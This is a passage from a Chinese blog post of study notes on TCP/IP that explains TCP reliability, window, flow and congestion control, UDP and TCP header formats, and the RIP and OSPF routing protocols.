alt="应答包丢失"></p><p>也有可能因为一些其他原因导致确认应答延迟到达，在源主机重发数据以后才到达的情况也屡见不鲜。此时，源发送主机只要按照机制重发数据即可。但是对于目标主机来说，这简直是一种“灾难”，它会反复收到相同的数据。而为了对上层应用提供可靠的传输，必须得放弃重复的数据包，为此，就必须引入一种机制，它能够识别是否已经接收数据，又能判断是否需要接收。</p><p>上述这些确认应答处理，重发控制以及重复控制等功能都可以通过序列号实现。序列号是按顺序给发送数据的每一个字节都标上号码的编号。接收端查询接收数据TCP首部中的序列号和数据长度，将自己的下一步应该接收的序号最为确认应答返送回去。通过序列号和确认应答号，TCP可以实现可靠传输。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230421105845628.png" alt="序列号机制"></p><p><strong>2. 重发超时如何确定</strong></p><p>重发超时是指重发数据之前，等待确认应答到来的那个特定时间间隔。如果超过了这个时间仍未收到确认应答，发送端将进行数据重发。</p><p>找到一个最小时间，它能保证“确认应答一定能在这个时间内返回”，然而这个时间长短随着数据包途径的网络环境的不同而有所变化。所以它在每次发包时都会计算往返时间及其偏差。将这个往返时间和偏差相加重发超时的时间，就是比这个总和要稍大一点的值。</p><p><strong>3. 连接管理</strong></p><p>TCP提供面向有连接的通信传输。面向有连接是指在数据通信开始之前先做好通信两端之间的准备工作</p><p>可以使用TCP首部用于控制的字段来管理TCP连接，一个连接的建立与断开，正常过程至少需要来回发送7个包才能完成。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230421111817969.png" alt="TCP连接"></p><p><strong>4. TCP以段为单位发送数据</strong></p><p>在建立TCP连接的同时，也可以确定发送数据包的单位，我们也可以称其为最大消息长度(MSS)。而MSS是在三次握手的时候，在两端主机之间被计算得出。两端的主机在发出建立连接的请求是，会在TCP首部中写入MSS选项，告诉对方自己的接口能够适应的MSS的大小，然后再挑选一个较小的值投入使用。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230421112530814.png" alt="MSS"></p><p><strong>5. 利用窗口控制提高速度</strong></p><p>TCP以1个段为单位，每发一个段进行一次确认应答的处理，这样传输的缺点就是，包的往返时间越长通信性能就越低。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230421135159912.png" alt></p><p>为了解决这个问题，TCP就引入了<strong>窗口</strong>的概念。</p><p>确认应答的不再是每个分段，而是以更大的单位进行确认时，转发时间将会被大幅度的缩短，也就是说，发送端主机在发送了一个段以后不必要一直等待确认应答，而是继续发送。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230421135350011.png" alt="窗口"></p><p>窗口大小就是无需等待确认应答而可以继续发送数据的最大值</p><p>这个机制实现了使用大量的缓冲区，通过对多个段同时进行确认应答的功能</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230421135616982.png" alt="窗口机制"></p><p>当数据发出后若如期收到确认应答就可以不再进行重发，此时数据就可以从缓存区清除，收到确认应答的情况下，将窗口滑动到确认应答中的序列号的位置。这样可以顺序地对多个段同时发送提供通信性能。这种机制也被称为滑动窗口控制。</p><p><strong>6. 窗口控制与重发控制</strong></p><p>如果出现了段丢失该怎么办？</p><p><strong>（1）确认应答未能返回</strong></p><p>在这种情况下，数据已经到达对端是不需要再进行重发的。但是，在没有使用窗口控制的时候，没有收到确认应答的数据都会被重发，而使用了窗口控制，某些确认应答即使丢失也无需重发，可以通过下一个确认应答进行确认。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230421140058907.png" alt="确认应答未能返回"></p><p><strong>（2）报文段丢失</strong></p><p>当某一报文段丢失之后，发送端会一直收到序号为1001的确认应答，这个确认应答好像是在提醒发送端“我想接收的是从1001开始的数据”。因此，在窗口比较大的时候，又出现报文段丢失的情况下，同一个序号的确认应答将会被重复不断地返回，而发送端主机如果连续3次收到同一个确认应答，就会将其所对应的数据进行重发。这种机制比之前提到的超时管理更加高效，因此也被称作高速重发控制。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230421140310407.png" alt="报文段丢失"></p><p><strong>7. 流控制</strong></p><p>发送端根据自己的实际情况发送数据。但是接收端可能收到的是一个毫无关系的数据包又可能会在处理其他时间上花费一些时间。因此在为这个数据包做其他处理时会耗费一些时间，甚至在高负荷的情况下无法接收任何数据。如此一来，如果接收端将本应该接收的数据丢弃的话，就又会触发重发机制，从而导致网络流量的无端浪费。</p><p>为了防止这种现象，TCP提供一种机制可以让发送端根据接收端的实际接收能力控制发送的数据量，这就是<strong>流控制</strong>。</p><p>具体操作：接收端主机向发送端主机通知自己可以接收数据的大小，于是发送端发送不超过这个限度的数据。该大小限度就被称作窗口大小。</p><p>TCP首部中，专门有一个字段用来通知窗口大小，接收主机将自己可以接收的缓冲区大小放入这个字段中通知给发送端。这个字段的值越大，说明网络的吞吐量越高。</p><p>不过接收端的这个缓冲区一旦面临数据溢出时，窗口的大小的值也会被随设置为一个更小的值通知给发送端，从而控制数据发送量。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230421141147751.png" alt="流控制"></p><p><strong>8. 拥塞控制</strong></p><p>有了TCP的窗口控制，收发主机之间即使不再以一个数据段为单位发送确认应答，也能连续发送大量的数据包。然而，如果在通信刚开始就发送大量的数据，会发生网络拥堵，可能会导致整个网络的瘫痪。</p><p>为了防止这个问题，在通信一开始的时候就会通过一个叫做慢启动的算法得出数值，对发送数据量进行控制。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230421141436915.png" alt="拥塞控制"></p><p>定义了一个叫做<strong>拥塞窗口</strong>的概念。</p><p>于是在慢启动的时候，将这个拥塞窗口的大小设置为1个数据段发送数据，之后每收到一次确认应答，拥塞窗口的值就加1，1-&gt;2-&gt;4-&gt;8……在发送数据包时，将拥塞窗口的大小与接收端主机通知的窗口大小做比较，然后按照他们当中较小的值，发送比其还要小的数据量。</p><p>但是为了防止拥堵状况激增甚至导致网络拥堵的发生。为了防止这些，引入了慢启动阈值的概念。只要拥塞窗口的值超过这个阈值，在每收到一次确认应答时，只允许以下面的比例放大拥塞窗口</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230421141906928.png" alt></p><p>拥塞窗口越大，确认应答的数目也会增大。不过随着每收到一个确认应答，其涨幅也会逐渐减少</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230421143649314.png" alt="TCP窗口变化"></p><p>TCP在刚建立连接完成后，并没有设置相应的慢启动阈值，而是在超时重发的时候，才会设置为当时拥塞窗口一半的大小。</p><p>首先是慢启动的过程，当发送方每收到一个ACK，拥塞窗口cwnd的大小就会加1（1-&gt;2-&gt;4-&gt;8)，此时超时，设置慢启动的阈值为当前拥塞窗口的一半。</p><p>然后再次慢启动，达到慢启动阈值之后，使用<strong>拥塞避免</strong>算法</p><p>每收到一个ack时，拥塞窗口增加：<strong>1/拥塞窗口</strong>，就是线性增长。</p><p>如果发生了重复确认应答进行高速重发控制的时候，慢启动阈值的大小被设置为当时窗口大小的一半，然后将窗口的大小设置为<strong>该慢启动阈值+3个数据段的大小</strong>。</p><p>以上就是拥塞窗口变化的全过程。</p><p><strong>9. 提高网络利用率的规范</strong></p><p><strong>Nagle算法</strong>是指发送端即使还有应该发送的数据，但如果这部分数据很少的话，则进行延迟发送的一种处理机制。</p><p>具体来说，就是需要满足一定的条件，才能发送数据。</p><p>如果两个条件都不满足，那么暂停等待一段时间以后再进行数据发送</p><p>（1）已发送的数据都已收到确认应答</p><p>（2）可以发送最大段长度（MSS)的数据时</p><p>这个算法虽然可以提高网络利用率，但是可能会发生某种程度的延迟。为此，在窗口系统以及机械控制等领域中使用TCP时，往往会关闭该算法的启用。</p><p><strong>延迟确认应答</strong></p><p>接收数据的主机如果每次都立刻回复确认应答的话，可能会返回一个较小的窗口。那是因为刚接收完数据，缓冲区已满。</p><p>当某个接收端收到这个小窗口的通知以后，会以它为上限发送数据，从而又降低了网络的利用率。为此，引入了一个方法，那就是收到数据以后并不立即返回确认应答，而是延迟一段时间的机制。</p><p>（1）在没有收到2×最大段长度的数据为止不做确认应答</p><p>（2）其他情况下，最大延迟0.5秒发送确认应答</p><p>正如滑动窗口的控制机制，确认应答少一些也无妨。TCP文件传输中，绝大多数是每两个数据段返回一次确认应答。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230421151327750.png" alt></p><p><strong>捎带应答</strong></p><p>根据应用层协议，发送出去的消息到达对端，对端进行处理以后，会返回一个回执。</p><p>TCP的确认应答和回执数据可以通过一个包发送，这种方式叫做捎带应答，通过这种机制，可以使收发的数据量减少。</p><p>另外，接收数据以后如果立刻返回确认应答，就无法实现捎带应答。而是将所接收的数据传给应用处理生成返回数据以后进而再进行发送请求为止，必须一直等待确认应答的发送</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230421152023734.png" alt="捎带应答"></p><h3 id="6-5-其他传输层协议"><a href="#6-5-其他传输层协议" class="headerlink" title="6.5 其他传输层协议"></a>6.5 其他传输层协议</h3><p><strong>1. UDP-Lite</strong></p><p>UDP-Lite是扩展UDP机能的一种传输层协议。在基于UDP的通信当中如果出现校验和出现错误，所收到的包将被全部丢弃。然而，现实操作中，有些应用在面对这种情况时并不希望把已经收到的所有包丢弃。</p><p>如果将UDP中校验和设置为无效，那么即使数据的一部分发生错误也不会将整个包废弃。不过，这不是一个很好的办法，因为如果发生的错误有可能是UDP首部中的端口号被破坏或时IP首部中的IP地址被破坏，就会产生严重后果。</p><p><strong>2. SCTP</strong></p><p><strong>SCTP（流控制传输协议）</strong>与TCP一样，都是对一种提供数据到达与否相关可靠性检查的传输层协议。</p><p>（1）以消息为单位收发：TCP中接收端并不知道发送端应用所决定的消息大小，在SCTP中却可以。</p><p>（2）支持多重宿主：在有多个NIC的主机中，即使其中能够使用的NIC发生变化，也仍然可以继续通信。</p><p>（3）支持多数据流通信：TCP中建立多个连接以后才能进行通信的效果，在SCTP中一个连接就可以。</p><p>（4）可以定义消息的生存期限：超过生存期限的消息，不会被重发</p><p>SCTP主要用于进行通信的应用之间发送众多较小消息的情况。这些较小的应用消息被称作数据块，多个数据块组成一个数据包。</p><p>此外，SCTP具有支持多重宿主以及设定多个IP地址的特点。多重宿主是指同一台主机具备多种网络的接口。</p><p><strong>3. DCCP</strong></p><p>DCCP（数据报拥塞控制协议）是一个辅助UDP的崭新的传输层协议。UDP没有拥塞控制机制。为此，当应用使用UDP发送大量数据包时极容易出现问题，于是出现了DCCP这样的规范。</p><p>（1）与UDP一样，不能提供发送数据的可靠性传输</p><p>（2）它面向连接，具备建立连接与断开连接的处理。在建立和断开连接上是具有可靠性。</p><p>（3）能够根据网络拥堵情况进行拥塞控制</p><p>（4）为了进行拥塞控制，接收端收到包以后返回确认应答。</p><h3 id="6-6-UDP首部的格式"><a href="#6-6-UDP首部的格式" class="headerlink" title="6.6 UDP首部的格式"></a>6.6 UDP首部的格式</h3><p>UDP首部由源端口号，目标端口号，包长和校验和组成</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230421153633081.png" alt="UDP首部"></p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230422133035551.png" alt="伪首部"></p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230422132500595.png" alt="UDP字段"></p><p>UDP的校验和需要计算UDP首部加数据荷载部分，同时也需要加上UDP伪首部。</p><p>UDP校验和计算：</p><p>如果UDP数据报部分不是偶数个字节，则要在数据部分末尾增加一个全零字节。</p><p>（1）按每16位求和得到一个32位的数；</p><p>（2）如果这个32位的数，高16位不为0，则高16位加低16位再得到一个32位的数</p><p>（3）重复第二步直到高16位为0，将低16位取反，得到校验和</p><p>填好校验和之后就将伪首部去掉。</p><p>接收主机在收到UDP数据报以后，从IP首部得知IP地址信息构造UDP伪首部，再进行校验和计算。校验和字段的值是校验和字段以外剩下部分的1的补码和。只有计算结果和校验和字段的值是一致的才会被认为所收到的数据是正确。</p><p><strong>校验和计算中计算UDP伪首部的理由</strong></p><p>因为TCP/IP中识别一个进行通信的应用需要5大要素，分别是“源IP地址”、“目标IP地址”、“源端口”、“目标端口”、“协议号”。然而，如果在UDP的首部中只包含了它们中的两项。如果其余3项被破坏了，那么就会导致应该收包的应用收不到包，不该收到包的应用却收到了包。</p><h3 id="6-7-TCP首部格式"><a href="#6-7-TCP首部格式" class="headerlink" title="6.7 TCP首部格式"></a>6.7 TCP首部格式</h3><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230422135345677.png" alt="TCP首部格式"></p><p><strong>序列号</strong>不会从0或1开始，而是在建立连接时由计算机生成的随机数作为其初始值，通过SYN包传给接收端主机。然后再将每转发过去的字节数累加到初始值上表示数据的位置。此外，在建立连接和断开连接时发送的SYN包和FIN包虽然并不携带数据，但是也会作为一个字节增加对应的序列号。</p><p><strong>确认应答号</strong>是指下一次应该收到的数据的序列号。实际上，它是指已收到确认应答号减一为止的数据。发送端收到这个确认应答以后可以认为在这个序号以前的数据都已经被正常接收。</p><p><strong>数据偏移</strong>表示TCP所传输的数据部分应该从TCP包的哪个位开始计算，当然可以把它当做TCP首部的长度，长4位，单位为4字节。不包括选项字段的话，TCP首部的长度为20字节长，因此数据偏移字段可以设置为5。意为从TCP包最一开始到20字节都是首部，余下部分是TCP数据。</p><p><strong>保留</strong>是为了以后扩展使用，其长度为4位。一般设置为0，但即使收到的包在该字段不为0，此包也不会被丢弃。</p><p><strong>控制位</strong>字段长度为8位，每一位从左到右分别是CWR、ECE、URG、ACK、PSH、RST、SYN、FIN</p><p><strong>CWR：</strong>CWR标志与后面的ECE标志都用于IP首部的ECN字段。ECE标志为1时，则通知对方已将拥塞窗口缩小。</p><p><strong>ECE：</strong>表示ECN-Echo。置为1会通知通信对方，从对方到这边的网络有拥堵。在收到数据包的IP首部中ECN为1时将TCP首部中的ECE设置为1。</p><p><strong>URG：</strong>表示包中有紧急处理的数据</p><p><strong>ACK：</strong>确认应答的字段变为有效。TCP规定除了最初建立连接时的SYN包之外该位必须设置为1</p><p><strong>PSH：</strong>表示需要将受到的数据立刻传给上层应用协议。PSH为0时，则不需要立即传而是先进行缓存。</p><p><strong>RST：</strong>表示TCP连接中出现异常必须强制断开连接</p><p><strong>SYN：</strong>用于建立连接。SYN为1表示希望建立连接</p><p><strong>FIN：</strong>表示今后不再有数据发送，希望断开连接。当通信结束希望断开连接时，通信双方的主机之间就可以互相交换FIN位置为1的TCP段。</p><p><strong>窗口大小：</strong>用于通知从相同TCP首部的确认应答号所指位置开始能够接收的数据大小。TCP不允许发送超过此处所示大小的数据。不过如果窗口为0，则表示可以发送窗口探测，以了解最新的窗口大小。</p><p><strong>校验和：</strong>与UDP类似，区别在于TCP的校验和无法关闭。</p><p>同样需要使用TCP伪首部，同样不是16位的整数倍，需要进行填充。</p><p><strong>使用校验和的目的是什么？</strong></p><p>有噪声干扰的通信途中如果出现位错误，可以由数据链路的FCS检查出来。那么为什么TCP或UDP中也需要校验和？</p><p>因为TCP或UDP的校验和是一种进行路由器内存故障或程序漏洞导致的数据是否被破坏的检查。如果指针使用不当，极有可能会破坏内存中的数据结构。路由器的程序中也有可能会存在漏洞，或程序异常宕掉的可能。在互联网中发送数据包要经由好多个路由器，一旦在发送途中的某一个路由器发生故障，经过此路由器的包、协议首部或数据就极有可能被破坏。即使在这种情况下，TCP或UDP如果能够提供校验和计算，也可以判断协议首部和数据是否被破坏。</p><p><strong>紧急指针</strong>只有在URG控制位为1时有效，该字段的数值表示本报文段中紧急数据的指针。正确来讲，从数据部分的首位到紧急指针所只是的位置为止为紧急数据。</p><p><strong>选项</strong>用于提高TCP的传输性能。因为根据数据偏移进行控制，所以其长度最大为40字节。（数据偏移最大为15*4=60字节，减去前面的20字节，剩下的还有40字节全部为选项）</p><p>选项字段尽量调整其为32位的整数倍。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230422151642740.png" alt="选项"></p><p>类型2的MSS选项用于在建立连接时决定最大段长度的情况。这选项用于大部分的操作系统。</p><p>类型3的窗口扩大是一个用来改善TCP吞吐量的选项。正常安全窗口大小字段，最大也只能发送64KB的数据，如果采用了这个选项，窗口的最大值可以扩展到1G字节。</p><p>类型8的时间戳字段选项，用于高速通信中对序列号的管理。</p><p><strong>吞吐量由窗口大小和往返时间决定</strong></p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230422152113438.png" alt="最大吞吐量"></p><p>W是窗口大小，RTT是往返时间</p><h2 id="第7章-路由协议"><a href="#第7章-路由协议" class="headerlink" title="第7章 路由协议"></a>第7章 路由协议</h2><h3 id="7-1-路由控制的定义"><a href="#7-1-路由控制的定义" class="headerlink" title="7.1 路由控制的定义"></a>7.1 路由控制的定义</h3><p>为了能让数据包正确到达目的地，路由器必须在途中进行正确的转发。这种正确的方向转发数据所进行的处理就叫做路由控制或路由。</p><p><strong>1. 静态路由与动态路由</strong></p><p>静态路由是指事先设置好路由器和主机中并将路由信息固定的一种方法</p><p>动态路由是指让路由协议在运行过程中自动地设置路由控制信息的一种方法。</p><p><strong>静态路由</strong>的设置通常需要使用者手工设置，因此会给管理者带来很大的负担，而且一旦某个路由器发生故障，基本上无法自动绕过发生故障的节点，只有在管理员手工设置以后才能恢复正常。</p><p><strong>动态路由</strong>的设置，管理员必须设置好路由协议，设定过程的复杂程度与具体要设置路由协议的类型有直接关系。</p><p>如果有一个新的网络被追加到原有的网络中时，只要在新增加网络的路由器上进行一个动态路由的设置即可。减轻了管理员负担，而且网络上一旦发生故障，只要有一个可绕的其他路径，那么数据包就会自动选择这个路径，路由器的设置也会自动重置。</p><p>但是定期相互交换路由控制信息，会与相邻的路由器之间互发消息，会给网络带来一定程度的负荷。</p><p><strong>2. 动态路由的基础</strong></p><p>动态路由会给相邻路由器发送自己已知的网络连接信息，而这些信息又像接力一样依次传递给其他路由器，直至整个网络都了解时，路由控制表，也就制作完成了。而此时也就可以正确转发IP数据包。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230422153204830.png" alt="动态路由"></p><h3 id="7-2-路由控制范围"><a href="#7-2-路由控制范围" class="headerlink" title="7.2 路由控制范围"></a>7.2 路由控制范围</h3><p>因为随着IP网络的发展，想要对所有网络统一管理是不可能的事。因此，人们根据路由控制的范围常使用IGP和EGP两种类型的路由协议</p><p><strong>自治系统与路由协议</strong></p><p>企业内部网络的管理方针，往往由该企业组织内部自行决定。因此每个企业或组织结构对网络管理和运维的方法都不尽相同。制定自己的路由策略，并以此为准在一个或多个网络群体中采用的小型单位叫做<strong>自治系统（AS：Autonomous System）或路由选择域（Routing Domain）</strong></p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230422154407889.png" alt="自治系统和路由协议"></p><p>自治系统内部动态路由采用的协议使域内路由协议，即IGP，而自治系统之间的路由控制采用的是域间路由协议，即EGP</p><p><strong>IGP和EGP</strong></p><p>路由协议分为两类：一类是外部网关协议EGP，另一类是内部网关协议IGP。</p><p>IGP中还可以使用RIP、RIP2、OSPF等众多协议。</p><p>EGP可以使用BGP协议</p><h3 id="7-3-路由算法"><a href="#7-3-路由算法" class="headerlink" title="7.3 路由算法"></a>7.3 路由算法</h3><p>路由控制有各种各样的算法，其中最具有代表性的有两种，是距离向量算法和链路状态算法。</p><p><strong>1. 距离向量算法</strong></p><p>距离向量算法（DV）是指根据距离和方向决定目标网络或目标主机位置的一种方法。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230422192205004.png" alt="距离向量算法"></p><p>路由器之间可以互换目标网络的方向及其距离的相关信息，并以这些信息为基础制作路由控制表。</p><p>但是问题在于只有距离和方向的信息，所以当网络构造变得分外复杂时，在获得稳定的路由信息之前，需要消耗一定的时间，也极易发生路由循环等问题。</p><p><strong>2. 链路状态算法</strong></p><p>链路状态算法是路由器在了解网络整体连接状态的基础上生成路由控制表的一种方法。</p><p><strong>距离向量算法</strong>中每个路由器掌握的信息都不相同。通往每个网络所耗的距离也根据路由器的不同而不同。因此，该算法的一个缺点就是不太容易判断每个路由器上的信息是否正确。</p><p><strong>链路状态算法</strong>中所有路由器持有相同的信息。对于任何一台路由器，网络拓扑都完全一致。因此，只要某一台路由器与其他路由器保持同样的路由控制信息，就意味着该路由器上的路由信息是正确的。只要每个路由器尽快地与其他路由器同步路由信息，就可以使路由信息达到一个稳定的状态。</p><p>因此，它的优势在于即使网络结构变得复杂，每个路由器也能够保持正确的路由信息、进行稳定的路由选择。</p><p>但是弊端也是在于如何从网络代理获取路由信息表。这一过程相当复杂，特别是在一个规模巨大而又复杂的网络结构中，管理和处理代理信息需要高速CPU处理能力和大量的内存。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230422193132717.png" alt="链路状态算法"></p><p><strong>3. 主要路由协议</strong></p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230422193229920.png" alt="路由协议"></p><h3 id="7-4-RIP"><a href="#7-4-RIP" class="headerlink" title="7.4 RIP"></a>7.4 RIP</h3><p>RIP是距离向量型的一种路由协议，广泛用于LAN。</p><p><strong>1， 广播路由控制信息</strong></p><p>RIP将路由控制信息定期（30秒）向全网广播。如果没有收到路由控制信息，连接就会断开。不过，这有可能是由于丢包导致的，因此RIP规定等待5次。如果等了6次仍未收到路由信息，才会真正关闭连接。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230422200129303.png" alt="RIP"></p><p><strong>2. 根据距离向量确定路由</strong></p><p>RIP基于距离向量算法决定路径。距离的单位为“跳数”。跳数是指所经过的路由器的个数。RIP希望尽可能少通过路由器将数据包转发到目标IP地址</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230422201144959.png" alt="根据距离向量确定路由"></p><p><strong>3. 使用子网掩码时的RIP处理</strong></p><p>RIP虽然不交换子网掩码，但可以用于使用子网掩码的网络环境。但是需要注意以下几点：</p><p>（1）从接口的IP地址对应分类得出网络地址后，与根据路由控制信息流过此路由器包中的IP地址对应的分类得出的网络地址进行比较。如果两者的网络地址相同，那么就以接口的网络地址长度为准。</p><p>（2）如果两者的网络地址不同，那么以IP地址的分类所确定的网络地址长度为准。</p><p><strong>因此，采用RIP进行路由控制的范围内必须注意两点：一是，因IP地址的分类而产生不同的网络地址时；二是，构造网络地址长度不同的网络环境时。</strong></p><p><strong>4. RIP中路由变更时的处理</strong></p><p>RIP的基本行为可归纳为如下两点</p><p>（1）将自己所知道的路由信息定期进行广播</p><p>（2）一旦认为网络被断开，数据将无法流过此路由器，其他路由器也就可以得知网络已经断开</p><p>但是存在着问题，路由器A虽然察觉到自己与网络A的连接已经断开，无法将网络A的信息发送给路由器B，但是它会收到路由器B曾经获知的消息。这就使得路由器A误以为自己的信息还可以通过路由器B到达网络A。</p><p>像这样收到自己发出去的消息，这个问题被称为<strong>无限计数</strong>。</p><p><strong>解决办法：</strong></p><p>1、最长距离不超过16，由此即使发生了无限计数的问题，也可以从时间上进行控制。</p><p>2、规定路由器不再把所收到的路由消息原路返回给发送端。这也叫做水平分割。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230423104848747.png" alt="无限计数问题"></p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230423104902992.png" alt="水平分割"></p><p>但是水平分割无法解决<strong>网络本身有环路</strong>的问题</p><p>对于网络本身有环路的问题，提出了“<strong>毒性逆转</strong>”和“<strong>触发更新</strong>”</p><p><strong>毒性逆转</strong>是指当网络中发生链路被断开的时候，将无法通信的这个消息传播出去，即发生一个距离为16的消息。</p><p><strong>触发更新</strong>是指当路由器信息发生变化的时候，不等待30秒而是立刻发送出去的一种方法。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230423105358597.png" alt="触发更新"></p><p>有了这两种机制，在链路不通的时候，可以迅速传送消息以使路由信息尽快收敛。</p><p><strong>5. RIP2</strong></p><p>更新点：</p><p><strong>（1）使用多播</strong>：RIP中当路由器之间交换路由信息时采用广播的形式，然而在RIP2中改用了多播，这样可以减少网络的流量，还缩小了对无关主机的影响。</p><p><strong>（2）支持子网掩码：</strong>RIP2支持在其交换的路由信息中加入子网掩码信息。</p><p><strong>（3）路由选择域：</strong>与OSPF的区域类似，在同一个网络中可以使用逻辑上独立的多个RIP。</p><p><strong>（4）外部路由标志：</strong>通常用于把从BGP等获得的路由控制信息通过RIP传递给AS内。</p><p><strong>（5）身份验证密钥：</strong>与OSPF一样，RIP包中携带密码。只有在自己能够识别这个密码时才接收数据，否则忽略这个RIP包。</p><h3 id="7-5-OSPF"><a href="#7-5-OSPF" class="headerlink" title="7.5 OSPF"></a>7.5 OSPF</h3><p>OSPF是根据OSI的IS-IS协议而提出的一种链路状态型路由协议。由于采用链路状态类型，所以即使网络中有环路，也能够进行稳定的路由控制。</p><p>OSPF支持子网掩码。由此，曾经在RIP中无法实现的可变长度子网结构的网络路由控制成为现实。</p><p><strong>1. OSPF是链路状态型路由协议</strong></p><p>路由器之间交换链路状态生成网络拓扑信息，然后再根据这个拓扑信息生成路由控制表。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230423134559687.png" alt="由链路状态确定路由"></p><p>RIP的路由选择要求途中所经过的路由器个数越少越好。与之相比，OSPF可以给每条链路赋予一个权重，并始终选择一个权重最小的路径作为最终路由。也就是说OSPF以每个链路上的代价为度量准备，始终选择一个总的代价最小的路径。</p><p><strong>2. OSPF基础知识</strong></p><p>在OSPF中，把连接到同一个链路的路由器称作相邻路由器。在一个相对简单的网络结构中，相邻路由器之间可相互交换路由信息。但是在一个比较复杂耳朵网络中就不需要在所有相邻的路由器之间都进行控制信息的交换，而是确定一个指定路由器，并以它为中心交换路由信息即可。</p><p><strong>RIP</strong>中包的类型只有一种。它利用路由控制信息，一边确认是否连接了网络，一边传送着网络信息。</p><p>但是如果网络的个数很多，那么每次要交换的路由控制信息就越大。而且当网络已经处于比较稳定的、没有什么变化的状态的时候，还要定期交换相同的路由控制信息，一定程度上浪费了网络带宽。</p><p><strong>OSPF</strong>中，根据作用的不同可以分为5种类型的包。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230423151632349.png" alt="OSPF"></p><p>问候包确认是否连接。</p><p>数据库描述包相互发送摘要信息和版本信息来同步路由控制信息。</p><p>链路状态请求包请求路由控制信息</p><p>链路状态更新包接收路由状态信息</p><p>链路状态确认包通知大家本地已经接收到了路由控制信息。</p><p><strong>3. OSPF工作原理概述</strong></p><p>OSPF中进行连接确认的协议叫做HELLO协议。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230423152002055.png" 